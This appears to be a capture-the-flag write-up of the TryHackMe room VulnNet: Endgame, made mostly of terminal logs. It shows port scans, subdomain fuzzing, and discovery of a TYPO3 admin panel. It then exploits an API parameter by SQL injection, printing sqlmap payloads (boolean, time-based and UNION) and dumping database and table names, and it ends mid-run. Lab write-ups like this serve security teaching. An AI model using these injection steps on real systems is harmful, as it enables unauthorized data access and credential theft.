# VulnNet Endgame — Writeup

## Overview
### VulnNet Endgame — Writeup
### VulnNet Endgame — Writeup
----
Hack your way into this simulated vulnerable infrastructure. No puzzles. Enumeration is the key.
----
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/5ec42470043801a381211912be05cfa6.png)
![](https://images.unsplash.com/photo-1489389944381-3471b5b30f04?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1170&q=80)
### VulnNet: Endgame
Start Machine
VulnNet series is back with a new challenge.
It's the final challenge in this series, compromise the system. Enumeration is the key.
Deploy the vulnerable machine by clicking the "Start Machine" button. Access the system at [http://10.10.246.2](http://10.10.246.2/) and [http://vulnnet.thm](http://vulnnet.thm/) domain. Answer the task questions to complete the challenge.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.246.2 vulnnet.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.246.2 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.246.2:22
Open 10.10.246.2:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Connect Scan
Scanning vulnnet.thm (10.10.246.2) [2 ports]
Discovered open port 80/tcp on 10.10.246.2
Discovered open port 22/tcp on 10.10.246.2
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on vulnnet.thm (10.10.246.2)
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.246.2.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for vulnnet.thm (10.10.246.2)
Host is up, received user-set (0.20s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb2ee6cc79f47d682c11bc4b631908af (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQRQ5sGPZniwdg1TNW71UdA6dc2k3lpZ68EnacCUgKEqZT7sBvppGUJjSAMY7aZqdZJ0m5N9SQajB9iW3ZEKHM5qtbXOadbWkRKp3VrqtZ8VW1IthLa2+oLObY2r1qep6O2NqrghQ/yVCbJYF5H8BsTtjCVNBeVSzf9zetwUviO6xfqIRO3iM+8S2WpZwKGtrBFvA9RaBsqLBGB1XGUjufKxyRUzOx1J2I94Xhs/bDcaOV5Mw6xhSTxgS3q6xVmL6UU3hIbpiXzYcj2vxuAXXszyZCM4ZkxmQ1fddQawxHfmZRnqxVogoHDsOGgh9tpQsc+S/KTrYQa9oFEVARV70x
|   256 8061bf8caad14d4468154533edeb82a7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEg9Hw4CIelacGVS0U+uFcwEj183dT+WrY/tvJV4U8/1alrGM/8gIKHEQIsU4yGPtyQ6M8xL9q7ak6ze+YsHd2o=
|   256 878604e9e0c0602aab878e9bc705351c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJJDCCks5eMviLJyDQY/oQ3LLgnDoXvqZS0AxNAJGv9T
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Soon &mdash; Fully Responsive Software Design by VulnNet
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.53 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u vulnnet.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.vulnnet.thm" --hc 404 --hw 9
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://vulnnet.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload  
=====================================================================

000000018:   200        390 L    1599 W     19316 Ch    "blog"   
000000037:   200        524 L    1406 W     26701 Ch    "shop"   
000000051:   200        0 L      4 W        18 Ch       "api"    
000000689:   400        10 L     35 W       301 Ch      "gc._msdc
                                                        s"       
000001219:   307        0 L      0 W        0 Ch        "admin1" 

4 subdomains found (add to /etc/hosts)

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts      
10.10.246.2 vulnnet.thm blog.vulnnet.thm shop.vulnnet.thm api.vulnnet.thm admin1.vulnnet.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://admin1.vulnnet.thm/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/admin1.vulnnet.thm/-_23-04-21_13-39-54.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-04-21_13-39-54.log

Target: http://admin1.vulnnet.thm/

[13:39:54] Starting: 
[13:40:19] 301 -  321B  - /en  ->  http://admin1.vulnnet.thm/en/
[13:40:23] 301 -  328B  - /fileadmin  ->  http://admin1.vulnnet.thm/fileadmin/
[13:41:09] 301 -  328B  - /typo3temp  ->  http://admin1.vulnnet.thm/typo3temp/
[13:41:09] 301 -  328B  - /typo3conf  ->  http://admin1.vulnnet.thm/typo3conf/
[13:41:09] 301 -  324B  - /typo3  ->  http://admin1.vulnnet.thm/typo3/
[13:41:11] 301 -  325B  - /vendor  ->  http://admin1.vulnnet.thm/vendor/

Task Completed

Login page (http://admin1.vulnnet.thm/typo3/)

http://blog.vulnnet.thm/post5.php

getJSON('http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5',  function(err, data) {

    if (err != null) {
        console.error(err);
    } else {
    	//unfinished
    	//move to js assets
        console.log(text);
    }
});

Boolean-based blind sqli 

using burp

GET /vn_internals/api/v2/fetch/?blog=5+AND+1337%3d1337--+- HTTP/1.1
Host: api.vulnnet.thm

Response:
HTTP/1.1 200 OK
Date: Fri, 21 Apr 2023 17:53:36 GMT
Server: Apache/2.4.29 (Ubuntu)
Access-Control-Allow-Origin: *
Content-Length: 136
Connection: close
Content-Type: application/json
{"request_id":"5 AND 1337=1337-- -","blog_id":"5","titles":"18 Things You Should Learn Before Moving Into a New Home","status":"draft"}

let's use sqlmap

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:56:36 //

[13:56:37] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[13:56:38] [INFO] testing connection to the target URL
[13:56:39] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:56:40] [INFO] testing if the target URL content is stable
[13:56:40] [INFO] target URL content is stable
[13:56:40] [INFO] testing if GET parameter 'blog' is dynamic
[13:56:41] [INFO] GET parameter 'blog' appears to be dynamic
[13:56:41] [WARNING] reflective value(s) found and filtering out
[13:56:41] [INFO] heuristic (basic) test shows that GET parameter 'blog' might be injectable
[13:56:42] [INFO] testing for SQL injection on GET parameter 'blog'
[13:56:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:56:44] [INFO] GET parameter 'blog' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[13:56:54] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:56:54] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:56:55] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:56:55] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:56:55] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:56:56] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:56:56] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[13:56:56] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:56:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:56:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:56:57] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:56:58] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:56:58] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:56:58] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:56:59] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:56:59] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:57:00] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[13:57:00] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[13:57:01] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[13:57:01] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[13:57:02] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[13:57:02] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[13:57:02] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[13:57:03] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:57:03] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[13:57:04] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[13:57:04] [INFO] testing 'Generic inline queries'
[13:57:05] [INFO] testing 'MySQL inline queries'
[13:57:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:57:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:57:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:57:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:57:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:57:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:57:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:57:19] [INFO] GET parameter 'blog' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:57:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:57:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:57:21] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:57:23] [INFO] target URL appears to have 3 columns in query
[13:57:25] [INFO] GET parameter 'blog' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'blog' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 5223=5223

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
---
[13:57:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[13:57:28] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[13:57:28] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 13:57:28 //

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D vn_admin --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:58:12 //

[13:58:12] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1; rv:2.0b10) Gecko/20110126 Firefox/4.0b10' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[13:58:12] [INFO] resuming back-end DBMS 'mysql' 
[13:58:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 5223=5223

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
---
[13:58:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[13:58:13] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[13:58:13] [INFO] fetching tables for database: 'vn_admin'
[13:58:13] [WARNING] reflective value(s) found and filtering out
Database: vn_admin
[48 tables]
+---------------------------------------------+
| backend_layout                              |
| be_dashboards                               |
| be_groups                                   |
| be_sessions                                 |
| be_users                                    |
| cache_adminpanel_requestcache               |
| cache_adminpanel_requestcache_tags          |
| cache_hash                                  |
| cache_hash_tags                             |
| cache_imagesizes                            |
| cache_imagesizes_tags                       |
| cache_pages                                 |
| cache_pages_tags                            |
| cache_pagesection                           |
| cache_pagesection_tags                      |
| cache_rootline                              |
| cache_rootline_tags                         |
| cache_treelist                              |
| fe_groups                                   |
| fe_sessions                                 |
| fe_users                                    |
| pages                                       |
| sys_be_shortcuts                            |
| sys_category                                |
| sys_category_record_mm                      |
| sys_collection                              |
| sys_collection_entries                      |
| sys_file                                    |
| sys_file_collection                         |
| sys_file_metadata                           |
| sys_file_processedfile                      |
| sys_file_reference                          |
| sys_file_storage                            |
| sys_filemounts                              |
| sys_history                                 |
| sys_language                                |
| sys_lockedrecords                           |
| sys_log                                     |
| sys_news                                    |
| sys_note                                    |
| sys_redirect                                |
| sys_refindex                                |
| sys_registry                                |
| sys_template                                |
| tt_content                                  |
| tx_extensionmanager_domain_model_extension  |
| tx_extensionmanager_domain_model_repository |
| tx_impexp_presets                           |
+---------------------------------------------+

[13:58:13] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 13:58:13 //

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D vn_admin -T be_users --columns
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:01:34 //

[14:01:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.0; fr-FR; rv:1.7.7) Gecko/20050414 Firefox/1.0.3' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:01:35] [INFO] resuming back-end DBMS 'mysql' 
[14:01:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 5223=5223

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
